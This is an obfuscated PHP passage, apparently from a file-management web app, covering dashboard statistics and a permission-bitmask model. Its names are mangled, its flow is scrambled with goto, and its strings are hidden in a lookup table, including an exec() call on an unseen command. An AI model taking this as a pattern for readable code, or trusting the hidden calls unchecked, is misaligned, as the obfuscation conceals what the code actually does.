$Døù«ÕÛÑ• = $this->validDate($Cò¾ñ²çğ¤, $FË°øŞÁ®š); $E×ÙÔØÖİ“ = array(); $BŒ¥ãè”‡ª = array_to_keyvalue($F™ëç‚‹Ş, $CòƒË²ÛŠº[222]); foreach ($Døù«ÕÛÑ• as $dñ‡Ë¸Éší) { if (isset($BŒ¥ãè”‡ª[$dñ‡Ë¸Éší])) { $fÂòï¡£ƒĞ = $BŒ¥ãè”‡ª[$dñ‡Ë¸Éší]; } else { $fÂòï¡£ƒĞ = end($F™ëç‚‹Ş); $fÂòï¡£ƒĞ[$CòƒË²ÛŠº[222]] = $dñ‡Ë¸Éší; if ($eß‡È„Íœ == $CòƒË²ÛŠº[562]) { $fÂòï¡£ƒĞ[$CòƒË²ÛŠº[1608]] = $fÂòï¡£ƒĞ[$CòƒË²ÛŠº[1609]] = 0; } } $E×ÙÔØÖİ“[] = $fÂòï¡£ƒĞ; } $F™ëç‚‹Ş = $E×ÙÔØÖİ“; } $e—¿¬ÔİÇš = array($CòƒË²ÛŠº[562] => array($CòƒË²ÛŠº[717] => LNG($CòƒË²ÛŠº[1624]), $CòƒË²ÛŠº[1608] => LNG($CòƒË²ÛŠº[1625]), $CòƒË²ÛŠº[1609] => LNG($CòƒË²ÛŠº[1626])), $CòƒË²ÛŠº[1610] => array($CòƒË²ÛŠº[715] => LNG($CòƒË²ÛŠº[1627]), $CòƒË²ÛŠº[1612] => LNG($CòƒË²ÛŠº[1628]), $CòƒË²ÛŠº[1613] => LNG($CòƒË²ÛŠº[1629]), $CòƒË²ÛŠº[1614] => LNG($CòƒË²ÛŠº[1630]))); $BÑëÕñ¡“É = array($CòƒË²ÛŠº[562] => $CòƒË²ÛŠº[1631], $CòƒË²ÛŠº[1610] => $CòƒË²ÛŠº[78]); goto eõ‚‚íÉÃ; eïÈ„¯ĞîŸ: } public function validDate($BÀ‰â‚ƒ®, $B’ÔäèŸ‹) { goto d˜Ã÷‹ìÅŸ; DÈÓâĞÒîë: return $DÛ‹’ˆÎ‡; goto a¯Ó÷ê¢Ñ; AôÄ¥™£: switch ($BÀ‰â‚ƒ®) { case $eÊØ¹œôÎ”[1498]: $fÍ‡Ã¯ = mktime(0, 0, 0, date($eÊØ¹œôÎ”[1632]), date($eÊØ¹œôÎ”[1244]) - date($eÊØ¹œôÎ”[1306]) + 7 - 7, date($eÊØ¹œôÎ”[1633])); $EÕ›º Ïó = 0; do { $D“Ç•ˆ¸¦â = date($eÊØ¹œôÎ”[1615], $fÍ‡Ã¯ - 3600 * 24 * 7 * $EÕ›º Ïó); $DÛ‹’ˆÎ‡[] = $D“Ç•ˆ¸¦â; $EÕ›º Ïó++; } while ($B’ÔäèŸ‹ < $D“Ç•ˆ¸¦â); break; case $eÊØ¹œôÎ”[1496]: $EÕ›º Ïó = 1; do { $c¶ÍèÇÈá = date($eÊØ¹œôÎ”[1634], strtotime("\55\40{$EÕ›º Ïó}\40\x6d\x6f\x6e\x74\150\163")); $DÛ‹’ˆÎ‡[] = $c¶ÍèÇÈá; $EÕ›º Ïó++; } while ($B’ÔäèŸ‹ < $c¶ÍèÇÈá); break; case $eÊØ¹œôÎ”[1635]: $a‚£šÛÅ¨ß = (int) date($eÊØ¹œôÎ”[1633], strtotime($B’ÔäèŸ‹)); $Cßê—‰¼‘“ = (int) date($eÊØ¹œôÎ”[1633]); if ($a‚£šÛÅ¨ß >= $Cßê—‰¼‘“) { break; } for ($a‚£šÛÅ¨ß; $a‚£šÛÅ¨ß < $Cßê—‰¼‘“; $a‚£šÛÅ¨ß++) { $DÛ‹’ˆÎ‡[] = $a‚£šÛÅ¨ß . $eÊØ¹œôÎ”[1636]; } break; default: break; } if ($B’ÔäèŸ‹ > end($DÛ‹’ˆÎ‡)) { array_pop($DÛ‹’ˆÎ‡); } sort($DÛ‹’ˆÎ‡); goto DÈÓâĞÒîë; d˜Ã÷‹ìÅŸ: $eÊØ¹œôÎ” =& $_SERVER[ÒÆ›ÆØÎ¾]; $F¿¿††•ÜÎ = date($eÊØ¹œôÎ”[1615], strtotime($eÊØ¹œôÎ”[1616])); $DÛ‹’ˆÎ‡ = array($F¿¿††•ÜÎ); goto AôÄ¥™£; a¯Ó÷ê¢Ñ: } public function listTable($bÑµÆùÔÅ) { $F‰¥Ü¶Î™ã = ucfirst($bÑµÆùÔÅ); return Model($F‰¥Ü¶Î™ã)->listData(); } public function option($FôÃÂáç) { $F»Ç½Æ¥¶¢ = $_SERVER[ÒÆ›ÆØÎ¾][1637] . ucfirst($FôÃÂáç); return $this->{$F»Ç½Æ¥¶¢}(); } private function optionUser() { goto F”ôº•ÙÂÊ; F”ôº•ÙÂÊ: $C­ÉÂæÛ†ô =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¸ „ë ¢‘ = Model($C­ÉÂæÛ†ô[506])->count($C­ÉÂæÛ†ô[1517]); $D¹í¬ÆÜ¨İ = Model($C­ÉÂæÛ†ô[506])->where($C­ÉÂæÛ†ô[1638])->count($C­ÉÂæÛ†ô[1517]); goto d„’öÁŠÈã; D§®‡£‘¾: if ($e‡÷ì´Ôƒ„ < $e¤¦¯šÕæÆ) { $e‡÷ì´Ôƒ„ = $e¤¦¯šÕæÆ; } $aâ·–Ô¢¥¾ = array($C­ÉÂæÛ†ô[1639] => array($C­ÉÂæÛ†ô[962], $e‡÷ì´Ôƒ„)); $Aš¾÷ŒÔª½ = (int) Model($C­ÉÂæÛ†ô[506])->where($aâ·–Ô¢¥¾)->count($C­ÉÂæÛ†ô[1517]); goto bòÓö‡ø¡; d„’öÁŠÈã: $cåó„ãÔ… = intval($GLOBALS[$C­ÉÂæÛ†ô[6]][$C­ÉÂæÛ†ô[347]][$C­ÉÂæÛ†ô[1477]]) / 3600; $e‡÷ì´Ôƒ„ = strtotime("\x2d{$cåó„ãÔ…}\x20\150\157\x75\162\163"); $e¤¦¯šÕæÆ = strtotime(date($C­ÉÂæÛ†ô[1619])); goto D§®‡£‘¾; D««Ğá»: return array($C­ÉÂæÛ†ô[711] => (int) $E¸ „ë ¢‘, $C­ÉÂæÛ†ô[1640] => (int) ($E¸ „ë ¢‘ - $D¹í¬ÆÜ¨İ), $C­ÉÂæÛ†ô[1641] => (int) $D¹í¬ÆÜ¨İ, $C­ÉÂæÛ†ô[1642] => (int) $cÇì—×¿‰ä, $C­ÉÂæÛ†ô[1643] => $Aš¾÷ŒÔª½); goto DÖã§èôó‡; bòÓö‡ø¡: if (!$Aš¾÷ŒÔª½) { $Aš¾÷ŒÔª½ = 1; } $aâ·–Ô¢¥¾ = array($C­ÉÂæÛ†ô[1639] => array($C­ÉÂæÛ†ô[962], $e¤¦¯šÕæÆ)); $cÇì—×¿‰ä = Model($C­ÉÂæÛ†ô[506])->where($aâ·–Ô¢¥¾)->count($C­ÉÂæÛ†ô[1517]); goto D««Ğá»; DÖã§èôó‡: } private function optionFile() { goto DÅ’ÛÈº’; d¶Éà±ãµğ: $e¶‚‹ã˜´ï = Model($aæ²ªÍ¦[782])->where($Aä¯Â¿“ˆ¡)->sum($aæ²ªÍ¦[78]); $A‰¯ÕÆº…ë = Model($aæ²ªÍ¦[782])->where($Aä¯Â¿“ˆ¡)->count($aæ²ªÍ¦[395]); return array($aæ²ªÍ¦[715] => $d‡’±Â–è°, $aæ²ªÍ¦[1612] => $a¸ß´Ç¶®, $aæ²ªÍ¦[1644] => $d‡’±Â–è° - $a¸ß´Ç¶®, $aæ²ªÍ¦[1645] => (int) $e¶‚‹ã˜´ï, $aæ²ªÍ¦[717] => (int) $a›‚ŸÃæ, $aæ²ªÍ¦[1646] => (int) $A‰¯ÕÆº…ë); goto cö¶â½áƒé; bİå…¿è: $a¸ß´Ç¶® = $A£°²ŞÍ®»[$aæ²ªÍ¦[1612]]; $a›‚ŸÃæ = Model($aæ²ªÍ¦[782])->where(array($aæ²ªÍ¦[403] => 0))->count($aæ²ªÍ¦[395]); $Aä¯Â¿“ˆ¡ = array($aæ²ªÍ¦[403] => 0, $aæ²ªÍ¦[194] => array($aæ²ªÍ¦[962], strtotime(date($aæ²ªÍ¦[1619])))); goto d¶Éà±ãµğ; DÅ’ÛÈº’: $aæ²ªÍ¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; $A£°²ŞÍ®» = $this->sourceSize(); $d‡’±Â–è° = $A£°²ŞÍ®»[$aæ²ªÍ¦[78]]; goto bİå…¿è; cö¶â½áƒé: } private function optionAccess() { $añµ¼¤‘Ä­ =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($añµ¼¤‘Ä­[711] => $this->typeLogCnt(), $añµ¼¤‘Ä­[107] => $this->typeLogCnt($añµ¼¤‘Ä­[107]), $añµ¼¤‘Ä­[430] => $this->typeLogCnt($añµ¼¤‘Ä­[430]), $añµ¼¤‘Ä­[1647] => $this->typeLogCnt($añµ¼¤‘Ä­[1647]), $añµ¼¤‘Ä­[1648] => $this->typeLogCnt($añµ¼¤‘Ä­[1648]), $añµ¼¤‘Ä­[562] => $this->typeLogCnt($añµ¼¤‘Ä­[33], $añµ¼¤‘Ä­[1623])); } private function typeLogCnt($a‹â¼ÜçŞˆ = '', $A®“«Ö¶¬Ô = "\151\144") { goto C¸ÚÎ±£¯; aÔÊâÆÃìÚ: $A½‡‰‡ì• = array($d®®î…Ö¼Í[194] => array($d®®î…Ö¼Í[962], $D¯»•â™Œó)); if ($a‹â¼ÜçŞˆ) { $A½‡‰‡ì•[$d®®î…Ö¼Í[29]] = array($d®®î…Ö¼Í[7], $AÚĞ½ä‚¼Í[$a‹â¼ÜçŞˆ]); } $d‚¯ßá‰¿— = Model($d®®î…Ö¼Í[1622])->where($A½‡‰‡ì•)->count($A®“«Ö¶¬Ô); goto CŸ¢¼Î†ÉÏ; C¸ÚÎ±£¯: $d®®î…Ö¼Í =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÚĞ½ä‚¼Í = array($d®®î…Ö¼Í[107] => array($d®®î…Ö¼Í[1649], $d®®î…Ö¼Í[1650]), $d®®î…Ö¼Í[430] => array($d®®î…Ö¼Í[1651], $d®®î…Ö¼Í[1652]), $d®®î…Ö¼Í[1647] => array($d®®î…Ö¼Í[1653], $d®®î…Ö¼Í[1654], $d®®î…Ö¼Í[1655]), $d®®î…Ö¼Í[1648] => array($d®®î…Ö¼Í[1656], $d®®î…Ö¼Í[1657]), $d®®î…Ö¼Í[1658] => array($d®®î…Ö¼Í[1659], $d®®î…Ö¼Í[1660], $d®®î…Ö¼Í[1661])); $D¯»•â™Œó = strtotime(date($d®®î…Ö¼Í[1619])); goto aÔÊâÆÃìÚ; CŸ¢¼Î†ÉÏ: return (int) $d‚¯ßá‰¿—; goto bùÅÛÛï ç; bùÅÛÛï ç: } private function optionServer() { goto a³âòè«; D¡‚Ïîª©Æ: $B…øñÃ–‘É = array($AÅ¯ã§¬Â[774] => $D‘£Ÿ¨âÒØ[$AÅ¯ã§¬Â[393]]); $cÖà¼«‡Ÿ­ = Model($AÅ¯ã§¬Â[450])->where($B…øñÃ–‘É)->sum($AÅ¯ã§¬Â[78]); $Dâí„ôø¨ = explode($AÅ¯ã§¬Â[50], $_SERVER[$AÅ¯ã§¬Â[142]]); goto DĞÑÓøÁ®±; Cì”øÆï”§: return array($AÅ¯ã§¬Â[1664] => $F„¹Üå½¤ ? $F„¹Üå½¤[$AÅ¯ã§¬Â[1665]] : 0, $AÅ¯ã§¬Â[1666] => $F„¹Üå½¤ ? $F„¹Üå½¤[$AÅ¯ã§¬Â[1667]] : 0, $AÅ¯ã§¬Â[1668] => (int) $D‘£Ÿ¨âÒØ[$AÅ¯ã§¬Â[1665]] * 1024 * 1024 * 1024, $AÅ¯ã§¬Â[1669] => (int) $cÖà¼«‡Ÿ­, $AÅ¯ã§¬Â[1670] => ucfirst($aø¼£ÙÁ¯º), $AÅ¯ã§¬Â[1671] => $AÅ¯ã§¬Â[1672] . PHP_VERSION, $AÅ¯ã§¬Â[1673] => phpBuild64() ? 64 : 32, $AÅ¯ã§¬Â[710] => str_replace($AÅ¯ã§¬Â[1674], $AÅ¯ã§¬Â[939], $A»†ğæßÒÅ), $AÅ¯ã§¬Â[347] => ucfirst($Fõ¾ìØ¬ê‡), $AÅ¯ã§¬Â[28] => $_SERVER[$AÅ¯ã§¬Â[1675]]); goto e¸™çîÌ; a³âòè«: $AÅ¯ã§¬Â =& $_SERVER[ÒÆ›ÆØÎ¾]; $F„¹Üå½¤ = $this->diskDriver(); $D‘£Ÿ¨âÒØ = KodIO::defaultDriver(); goto D¡‚Ïîª©Æ; DÌãŞç©ğ: if ($A»†ğæßÒÅ == $AÅ¯ã§¬Â[747]) { $AÓ³Ë±šƒ¬ = explode($AÅ¯ã§¬Â[1158], $B ƒù®´“õ[$AÅ¯ã§¬Â[922]]); $A»†ğæßÒÅ = $AÓ³Ë±šƒ¬[0]; } if ($A»†ğæßÒÅ == $AÅ¯ã§¬Â[750] || $A»†ğæßÒÅ == $AÅ¯ã§¬Â[751]) { $E•‹Î¯¾Ğ = Model()->db()->query($AÅ¯ã§¬Â[1662]); $CÎŠêğ¿ÍŠ = $E•‹Î¯¾Ğ[0] && isset($E•‹Î¯¾Ğ[0][$AÅ¯ã§¬Â[1422]]) ? $E•‹Î¯¾Ğ[0][$AÅ¯ã§¬Â[1422]] : 0; $A»†ğæßÒÅ = $AÅ¯ã§¬Â[1663] . ($CÎŠêğ¿ÍŠ ? $AÅ¯ã§¬Â[8] . $CÎŠêğ¿ÍŠ : $AÅ¯ã§¬Â[33]); } $Fõ¾ìØ¬ê‡ = $GLOBALS[$AÅ¯ã§¬Â[6]][$AÅ¯ã§¬Â[347]][$AÅ¯ã§¬Â[791]]; goto Cì”øÆï”§; DĞÑÓøÁ®±: $aø¼£ÙÁ¯º = $Dâí„ôø¨[0]; $B ƒù®´“õ = $GLOBALS[$AÅ¯ã§¬Â[6]][$AÅ¯ã§¬Â[17]]; $A»†ğæßÒÅ = $B ƒù®´“õ[$AÅ¯ã§¬Â[923]]; goto DÌãŞç©ğ; e¸™çîÌ: } private function diskDriver() { goto fÜ²İâöé; dÄÍÙƒµ´: $eˆÁì‡Ê›¡ = $b“ö®Şí¹  - @disk_free_space($BÖ»´Òˆ©”); return array($Dõ¥ÆÇŞà[1665] => $b“ö®Şí¹ , $Dõ¥ÆÇŞà[1667] => $eˆÁì‡Ê›¡); goto dğ×‹ç®Ô™; Eì‡ó™Îäà: if ($a¥æÛÂ¡¾¾) { $BÖ»´Òˆ©” = $Dõ¥ÆÇŞà[1678]; if (function_exists($Dõ¥ÆÇŞà[1679])) { exec($Dõ¥ÆÇŞà[1680], $BÑœôÈÆÂ); $BÖ»´Òˆ©” = $BÑœôÈÆÂ[1] . $Dõ¥ÆÇŞà[8]; } } if (!file_exists($BÖ»´Òˆ©”)) { return; } $b“ö®Şí¹  = @disk_total_space($BÖ»´Òˆ©”); goto dÄÍÙƒµ´; fÜ²İâöé: $Dõ¥ÆÇŞà =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÖ»´Òˆ©” = $Dõ¥ÆÇŞà[8]; $a¥æÛÂ¡¾¾ = $GLOBALS[$Dõ¥ÆÇŞà[6]][$Dõ¥ÆÇŞà[1676]] == $Dõ¥ÆÇŞà[1677]; goto Eì‡ó™Îäà; dğ×‹ç®Ô™: } public function fileChart($Bíİ¡ÌÏ•Í) { goto cÎÛÒÔÊ´Ù; cÎÛÒÔÊ´Ù: $B‘çÏ‹˜×ã =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($Bíİ¡ÌÏ•Í[$B‘çÏ‹˜×ã[1517]])) { return Model($B‘çÏ‹˜×ã[782])->userFileTypeProfile($Bíİ¡ÌÏ•Í[$B‘çÏ‹˜×ã[1517]]); } if (isset($Bíİ¡ÌÏ•Í[$B‘çÏ‹˜×ã[1681]])) { return Model($B‘çÏ‹˜×ã[782])->groupFileTypeProfile($Bíİ¡ÌÏ•Í[$B‘çÏ‹˜×ã[1681]]); } goto cÈŠƒÛŒáƒ; EÍÑ·êµò: $Eíá¥Ôîø[$B‘çÏ‹˜×ã[404]] = 2; $DèÑŞŞšµ = Model($B‘çÏ‹˜×ã[782])->where($Eíá¥Ôîø)->sum($B‘çÏ‹˜×ã[78]); return array($B‘çÏ‹˜×ã[715] => $F¬ÙôÄä‹½[$B‘çÏ‹˜×ã[78]], $B‘çÏ‹˜×ã[1612] => $F¬ÙôÄä‹½[$B‘çÏ‹˜×ã[1612]], $B‘çÏ‹˜×ã[1613] => (int) $Bİ› ŒÏô, $B‘çÏ‹˜×ã[1614] => (int) $DèÑŞŞšµ); goto c¿›à“õà¤; cÈŠƒÛŒáƒ: $F¬ÙôÄä‹½ = $this->sourceSize(); $Eíá¥Ôîø = array($B‘çÏ‹˜×ã[478] => 0, $B‘çÏ‹˜×ã[404] => 1); $Bİ› ŒÏô = Model($B‘çÏ‹˜×ã[782])->where($Eíá¥Ôîø)->sum($B‘çÏ‹˜×ã[78]); goto EÍÑ·êµò; c¿›à“õà¤: } private function sourceSize() { $B»Ù…ÇÏ¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $CóµÓÒù•¹ = Model($B»Ù…ÇÏ¸[782])->where(array($B»Ù…ÇÏ¸[403] => 0))->sum($B»Ù…ÇÏ¸[78]); $EñÕÆ®ÚÅš = Model($B»Ù…ÇÏ¸[450])->sum($B»Ù…ÇÏ¸[78]); if ($EñÕÆ®ÚÅš > $CóµÓÒù•¹) { $EñÕÆ®ÚÅš = $CóµÓÒù•¹; } return array($B»Ù…ÇÏ¸[78] => (int) $CóµÓÒù•¹, $B»Ù…ÇÏ¸[1612] => (int) $EñÕÆ®ÚÅš); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $cÔŠÒÕÏ™ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eòíªœŒ‹î = array(array($cÔŠÒÕÏ™[413] => LNG($cÔŠÒÕÏ™[1682]), $cÔŠÒÕÏ™[1683] => $cÔŠÒÕÏ™[1684], $cÔŠÒÕÏ™[1685] => 1, $cÔŠÒÕÏ™[1686] => 1, $cÔŠÒÕÏ™[1687] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($cÔŠÒÕÏ™[413] => LNG($cÔŠÒÕÏ™[1688]), $cÔŠÒÕÏ™[1683] => $cÔŠÒÕÏ™[1689], $cÔŠÒÕÏ™[1685] => 2, $cÔŠÒÕÏ™[1686] => 1, $cÔŠÒÕÏ™[1687] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($cÔŠÒÕÏ™[413] => LNG($cÔŠÒÕÏ™[1690]), $cÔŠÒÕÏ™[1683] => $cÔŠÒÕÏ™[1691], $cÔŠÒÕÏ™[1685] => 3, $cÔŠÒÕÏ™[1686] => 1, $cÔŠÒÕÏ™[1687] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($cÔŠÒÕÏ™[413] => LNG($cÔŠÒÕÏ™[1692]), $cÔŠÒÕÏ™[1683] => $cÔŠÒÕÏ™[1693], $cÔŠÒÕÏ™[1685] => 4, $cÔŠÒÕÏ™[1686] => 1, $cÔŠÒÕÏ™[1687] => self::AUTH_SHOW | self::AUTH_VIEW), array($cÔŠÒÕÏ™[413] => LNG($cÔŠÒÕÏ™[1694]), $cÔŠÒÕÏ™[1683] => $cÔŠÒÕÏ™[1695], $cÔŠÒÕÏ™[1685] => 5, $cÔŠÒÕÏ™[1686] => 1, $cÔŠÒÕÏ™[1687] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($cÔŠÒÕÏ™[413] => LNG($cÔŠÒÕÏ™[1696]), $cÔŠÒÕÏ™[1683] => $cÔŠÒÕÏ™[1697], $cÔŠÒÕÏ™[1685] => 6, $cÔŠÒÕÏ™[1686] => 1, $cÔŠÒÕÏ™[1687] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($cÔŠÒÕÏ™[413] => LNG($cÔŠÒÕÏ™[1698]), $cÔŠÒÕÏ™[1683] => $cÔŠÒÕÏ™[1699], $cÔŠÒÕÏ™[1685] => 7, $cÔŠÒÕÏ™[1686] => 1, $cÔŠÒÕÏ™[1687] => 0)); return $eòíªœŒ‹î; } public static function authCheck($b”é«‡Ÿ‰Í, $E†ª“ƒÒˆ) { $b”é«‡Ÿ‰Í = intval($b”é«‡Ÿ‰Í); if ($GLOBALS[$_SERVER[ÒÆ›ÆØÎ¾][485]]) { return !0; } if ($b”é«‡Ÿ‰Í <= 0) { return !1; } if (($b”é«‡Ÿ‰Í & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($b”é«‡Ÿ‰Í & $E†ª“ƒÒˆ); } public static function authCheckShow($EŞ³»Ã§ÄĞ) { return self::authCheck($EŞ³»Ã§ÄĞ, self::AUTH_SHOW); } public static function authCheckView($Cí£œÓ¾‹ä) { return self::authCheck($Cí£œÓ¾‹ä, self::AUTH_VIEW); } public static function authCheckDownload($f—ê»äæÛ“) { return self::authCheck($f—ê»äæÛ“, self::AUTH_DOWNLOAD); } public static function authCheckUpload($AèêÍ£ğ”¬) { return self::authCheck($AèêÍ£ğ”¬, self::AUTH_UPLOAD); } public static function authCheckEdit($eÌ¯…¨®¯») { return self::authCheck($eÌ¯…¨®¯», self::AUTH_EDIT); } public static function authCheckRemove($EŒ‘¿·Ôœ®) { return self::authCheck($EŒ‘¿·Ôœ®, self::AUTH_REMOVE); } public static function authCheckShare($B•Æ™¡Óß) { return self::authCheck($B•Æ™¡Óß, self::AUTH_SHARE); } public static function authCheckComment($E‡Ä´‹ÚŒ) { return self::authCheck($E‡Ä´‹ÚŒ, self::AUTH_COMMENT); } public static function authCheckEvent($F„¡É‹Â„…) { return self::authCheck($F„¡É‹Â„…, self::AUTH_EVENT); } public static function authCheckRoot($bğ²ò¥©øˆ) { return self::authCheck($bğ²ò¥©øˆ, self::AUTH_ROOT); } public static function authCheckAction($f¨°³ŸÜ÷¯, $fÒ˜åÎ·Ñ†) { goto Cœ·®¹·¦; Cœ·®¹·¦: $c¯í˜ˆ§Ø» =& $_SERVER[ÒÆ›ÆØÎ¾]; $BŸÛ·¿ˆİ„ = array($c¯í˜ˆ§Ø»[1700] => self::AUTH_VIEW, $c¯í˜ˆ§Ø»[1085] => self::AUTH_DOWNLOAD, $c¯í˜ˆ§Ø»[107] => self::AUTH_UPLOAD, $c¯í˜ˆ§Ø»[1648] => self::AUTH_EDIT, $c¯í˜ˆ§Ø»[1647] => self::AUTH_REMOVE, $c¯í˜ˆ§Ø»[1658] => self::AUTH_SHARE, $c¯í˜ˆ§Ø»[352] => self::AUTH_COMMENT, $c¯í˜ˆ§Ø»[1506] => self::AUTH_EVENT, $c¯í˜ˆ§Ø»[1701] => self::AUTH_ROOT); if (!isset($BŸÛ·¿ˆİ„[$fÒ˜åÎ·Ñ†])) { return; } goto EÈŒ„Ì¦µÆ; EÈŒ„Ì¦µÆ: $b†™š‘Â¿ = $BŸÛ·¿ˆİ„[$fÒ˜åÎ·Ñ†]; $f¨°³ŸÜ÷¯ = intval($f¨°³ŸÜ÷¯); if ($f¨°³ŸÜ÷¯ <= 0) { return !1; } goto F­ñ®–Ñ’; F­ñ®–Ñ’: if (($f¨°³ŸÜ÷¯ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($f¨°³ŸÜ÷¯ & $b†™š‘Â¿); goto Eë®¶ç³§Ä; Eë®¶ç³§Ä: } public static function authDisable($b×ÖŸÒŠ , $A®ä”Ê÷) { if (intval($b×ÖŸÒŠ ) <= 0) { return 0; } return intval($b×ÖŸÒŠ ) & ~$A®ä”Ê÷; } public $optionType = "\x53\171\x73\x74\x65\155\x2e\163\157\165\x72\x63\x65\x41\x75\x74\150\114\151\x73\x74"; public $field = array("\156\x61\155\x65", "\141\x75\164\150", "\154\x61\x62\x65\x6c", "\144\151\163\160\x6c\141\x79", "\x73\x79\163\x74\145\155", "\x73\x6f\162\x74"); public function initData() { $C°‚ğ‘˜ó› = $this->authDefault(); foreach ($C°‚ğ‘˜ó› as $eŸŸÕİ‹­Œ) { $this->add($eŸŸÕİ‹­Œ); } } public function listData($A±•·¯ôÆ = false, $cŒ¬©î£èò = "\x73\x6f\162\x74", $FôöÈø‡æÉ = false) { return parent::listData($A±•·¯ôÆ, $cŒ¬©î£èò, $FôöÈø‡æÉ); } public function update($F¾×ßò²­Ñ, $aƒ®Ù¼ì‘) { $E‚ßÇøÊ·œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÖèÅä½°í = parent::listData($F¾×ßò²­Ñ); $a—ÆÆ¢ù™® = $this->findByName($aƒ®Ù¼ì‘[$E‚ßÇøÊ·œ[28]]); if (!$EÖèÅä½°í || $a—ÆÆ¢ù™® && $a—ÆÆ¢ù™®[$E‚ßÇøÊ·œ[393]] != $EÖèÅä½°í[$E‚ßÇøÊ·œ[393]]) { return !1; } $this->filterAuth($aƒ®Ù¼ì‘[$E‚ßÇøÊ·œ[406]]); return parent::update($F¾×ßò²­Ñ, $aƒ®Ù¼ì‘); } public function remove($a„‡­ğå«) { $c…‹À–Ä¶ = parent::listData($a„‡­ğå«); if (!$c…‹À–Ä¶ || $c…‹À–Ä¶[$_SERVER[ÒÆ›ÆØÎ¾][1162]]) { return !1; } return parent::remove($a„‡­ğå«); } public function add($DËÏï™˜ß = array()) { goto DÔº§ÒÛ–Š; DÔº§ÒÛ–Š: $F˜ÁæŞ¡ø =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->findByName($DËÏï™˜ß[$F˜ÁæŞ¡ø[28]])) { return !1; } $E–”‘‡ë¾š = array($F˜ÁæŞ¡ø[28] => $F˜ÁæŞ¡ø[33], $F˜ÁæŞ¡ø[406] => 1, $F˜ÁæŞ¡ø[1702] => $F˜ÁæŞ¡ø[1691], $F˜ÁæŞ¡ø[1703] => 1, $F˜ÁæŞ¡ø[1162] => 0, $F˜ÁæŞ¡ø[1704] => 0); goto aîö¨¹Øæ; b²“··ïØÁ: return parent::insert($DËÏï™˜ß); goto cµ÷Æä¤…; aîö¨¹Øæ: $DËÏï™˜ß = array_merge($E–”‘‡ë¾š, $DËÏï™˜ß); $DËÏï™˜ß[$F˜ÁæŞ¡ø[1704]] = $this->getSort(); $this->filterAuth($DËÏï™˜ß[$F˜ÁæŞ¡ø[406]]); goto b²“··ïØÁ; cµ÷Æä¤…: } private function getSort() { $aï™ÒàÁ– =& $_SERVER[ÒÆ›ÆØÎ¾]; $d¡ñÎÖÓÃœ = parent::listData(); $fßÄ»İÚ˜ó = array_to_keyvalue($d¡ñÎÖÓÃœ, $aï™ÒàÁ–[33], $aï™ÒàÁ–[1704]); return empty($fßÄ»İÚ˜ó) ? 0 : max($fßÄ»İÚ˜ó) + 1; } private function filterAuth(&$bà¿›ì²Ñß) { goto d¬“Î¼Ÿ; d¬“Î¼Ÿ: if (!$bà¿›ì²Ñß) { return; } $c¸¼‹ï­ï§ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $c‰Œ‚ğ‡«Ò = array(); goto CÓ´ò¾Ú´Ö; FìİÅ¬¨ğ: foreach ($c‰Œ‚ğ‡«Ò as $A»­‡äÛ) { if (isset($AíàŠ½…½¾[$A»­‡äÛ])) { $c‰Œ‚ğ‡«Ò = array_merge($c‰Œ‚ğ‡«Ò, $AíàŠ½…½¾[$A»­‡äÛ]); } } $c‰Œ‚ğ‡«Ò[] = self::AUTH_SHOW; $bà¿›ì²Ñß = array_sum(array_unique($c‰Œ‚ğ‡«Ò)); goto cÊôÌã©êÙ; CÓ´ò¾Ú´Ö: foreach ($c¸¼‹ï­ï§ as $A»­‡äÛ) { if ($bà¿›ì²Ñß & $A»­‡äÛ) { $c‰Œ‚ğ‡«Ò[] = $A»­‡äÛ; } } if (in_array(self::AUTH_ROOT, $c‰Œ‚ğ‡«Ò)) { $bà¿›ì²Ñß = array_sum($c¸¼‹ï­ï§); return; } $AíàŠ½…½¾ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto FìİÅ¬¨ğ; cÊôÌã©êÙ: } public function sort($e±¡¨Á›¾, $Fï…ê¤Å¥) { return parent::update($e±¡¨Á›¾, $Fï…ê¤Å¥); } } goto Dâíù¦Á; 